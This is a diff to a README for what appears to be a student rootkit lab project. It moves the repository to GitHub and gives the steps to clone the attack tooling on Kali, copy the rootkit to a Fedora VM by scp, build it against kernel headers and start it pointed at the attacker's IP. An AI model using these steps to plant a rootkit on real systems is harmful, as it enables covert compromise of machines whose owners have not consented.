@@ -51,23 +51,17 @@ You will have to copy the result
 
 ![1750186613156](images/README/1750186613156.png)
 
-Go to the website: [https://cri.epita.fr/me/](https://cri.epita.fr/me/) and click on **SSH Keys**. For the title, you can put : **kali-root-kit**, and for the key, paste the text you previously copy. Then, click on Add SSH key.
-
-![1750112056754](images/README/1750112056754.png)
-
-Now, go to [https://intra.forge.epita.fr/epita-apprentissage/wlkom-apping-2027/root/wlkom](https://intra.forge.epita.fr/epita-apprentissage/wlkom-apping-2027/root/wlkom) and click on the copy button next to **Git remote**.
-
-![1750112262637](images/README/1750112262637.png)
+Copy the repo address.
 
 Go back to the Kali VM, and run:
 
-`git clone ` and paste your clipboard. it should look something like : `git clone lucas.aguetai@git.forge.epita.fr:p/epita-apprentissage/wlkom-apping-2027/epita-apprentissage-wlkom-apping-2027-init1.git`
+`git clone ` and paste your clipboard. it should look something like : `git clone git@github.com:Alexandre-Leclaire/rootkit.git`
 
-Press `Y`if they asked you, and wait until the download complete.
+Press `Y` if they asked you, and wait until the download complete.
 
 When it's done, run:
 
-`cd epita-apprentissage-wlkom-apping-2027-init1/attacking_program`
+`cd rootkit/attacking_program`
 
 `chmod u+x sendRootkit.sh && chmod u+x scripts/*`
 
@@ -112,7 +106,7 @@ Open a terminal, and run:
 
 `sudo dnf install make kernel-devel-$(uname -r) kernel-headers-$(uname-r) -y`
 
-Paste the command you copied from the attacking VM. it should look something like : `scp -r kali@10.0.2.15:/home/kali/epita-apprentissage-wlkom-apping-2027-init1/rootkit /tmp/`
+Paste the command you copied from the attacking VM. it should look something like : `scp -r kali@10.0.2.15:/home/kali/rootkit/rootkit /tmp/`
 
 `cd /tmp/rootkit`
 
@@ -120,7 +114,7 @@ Paste the command you copied from the attacking VM. it should look something lik
 
 `chmod u+x ./start.sh`
 
-To get the ip of the attacking VM, It will be the part between the **@** and the **:** from the command you copied. for example, from `scp -r kali@10.0.2.15:/home/kali/epita-apprentissage-wlkom-apping-2027-init1/rootkit /tmp/` the ip address is **10.0.2.15**
+To get the ip of the attacking VM, It will be the part between the **@** and the **:** from the command you copied. for example, from `scp -r kali@10.0.2.15:/home/kali/rootkit/rootkit /tmp/` the ip address is **10.0.2.15**
 
 `./start.sh IP 8080` (For example, `./start.sh 10.0.2.15 8080`)
 
